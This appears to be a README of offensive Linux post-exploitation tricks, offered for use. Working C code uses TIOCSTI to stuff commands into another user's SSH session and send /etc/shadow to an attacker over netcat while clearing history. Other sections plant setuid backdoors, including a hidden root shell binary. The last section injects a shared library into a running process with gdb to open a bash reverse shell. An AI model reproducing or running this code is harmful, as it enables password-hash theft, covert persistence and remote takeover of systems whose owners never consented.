# Linux-Trix
An assortment of techniques that can be used to exploit Linux.  Most of these assume that you have or can attain root privileges on the host.  You will need to change IP addresses and other references in the examples to fit your environment.

## >> Stuffing commands into an existing ssh session

**This example assumes the following**<br />
* The attacking Linux machine (A) is 192.168.1.7
* The victim Linux machine (B) is 192.168.1.5
* The remote host (C) that a user on (B) has an ssh session open to is 192.168.10.10

**You have aquired root on a target (B), check for active ssh client sessions to other remote hosts**<br />
`ps -ef | grep ssh | grep @`

Example output, you see user "bill" on "pts/1" connected to a remote host (C) as "root".<br />
`bill     18953 18855  0 08:42 pts/1    00:00:00 ssh root@192.168.10.10`

Compile the following C code on (B) as `ptshijack.c` to get `/etc/shadow` from (C).<br />
```c
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>

// gcc ptshijack.c -o ptshijack

int main()
{
   int fd = open("/dev/pts/1", O_RDWR);
   if(fd < 0)
   {
      perror("open");
      return -1;
   }
   // your commands to execute go here.
   char *x = "(cat /etc/shadow | nc 192.168.1.7 4444) &\nhistory -c\nclear\n";
   while(*x != 0)
   {
      int ret = ioctl(fd, TIOCSTI, x);
      if(ret == -1)
      {
         perror("ioctl()");
      }
      x++;
   }
   return 0;
}
```

**Start netcat on (A) to receive** `/etc/shadow` **from (C)**<br />
```nc -nlvp 4444```

**Execute** `ptshijack` **on (B) to send** `/etc/shadow` **from (C) to (A)**<br />
SIGINT (ctrl-c) netcat on (A) to terminate the background process on (C)<br />

## >> Persistence with setuid

Once you have root on a system leave these behind to exploit later:<br >
* `chmod u+s /usr/bin/chmod` and `chmod u+s /usr/bin/chown`, will allow you to create files as an ordinary user that execute as root.
* `chmod u+s /usr/bin/cat` will allow you to view `/etc/shadow` as an ordinary user.
* Compile the following C program as a hidden binary and setuid as root.<br />
```c
// gcc -o .setuid-shell setuid-shell.c
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <grp.h>

int main(int argc, char **argv)
{
   initgroups("root", 0);
   setgid(0);
   setuid(0);
   execve("/bin/bash", NULL, NULL);

   return 0;
}
```
setuid as root `chown root:root .setuid-shell` then `chmod u+s .setuid-shell`<br />
Now execute `.setuid-shell` and see that you are root by issuing the `id` command.

## >> Injecting a shared object into a running process to get a reverse shell

This technique will dynamically load a library (.so file) into an existing process to get a reverse shell as the user the process is running as.<br />
The attacker IP in this example is 192.168.1.19 and will be listening on port 4444 for the reverse shell.<br />
`nc -nlvp 4444`

**Compile the following C program**<br />
`gcc -O2 -fPIC -o libcallback.so ./libcallback.c -lpthread -shared`<br />
```c
#include <pthread.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

/*
   (compile)
   gcc -O2 -fPIC -o libcallback.so ./libcallback.c -lpthread -shared
   (copy)
   cp ./libcallback.so /tmp/libcallback.so
*/

// callback reverse shell destination
#define RVSADDR "192.168.1.19"
#define RVSPORT "4444"

// reverse shell command
#define COMMAND "echo 'exec >& /dev/tcp/" RVSADDR "/" RVSPORT " 0>&1' | nohup /bin/bash >/dev/null 2>&1 &"

void *callback(void *a);

__attribute__((constructor))
void start_callbacks()
{
   pthread_t tid;
   pthread_attr_t attr;

   if(pthread_attr_init(&attr) == -1)
   {
      return;
   }
   if(pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED) == -1)
   {
      return;
   }
   pthread_create(&tid, &attr, callback, NULL);
}

void *callback(void *a)
{
   system(COMMAND);
   return NULL;
}
```
**Copy the library file to the /tmp directory**<br />
`cp ./libcallback.so /tmp/libcallback.so`

**Find the PID of a target process to inject the library into**<br />
(e.g. PID selected is 2739) Some systems allow non-root users to debug their own processes.<br />
`echo 'print __libc_dlopen_mode("/tmp/libcallback.so", 2)' | gdb -p 2739`

You should see a connection to your netcat session listening on port 4444.  You should not lose your shell even if the parent process exits.
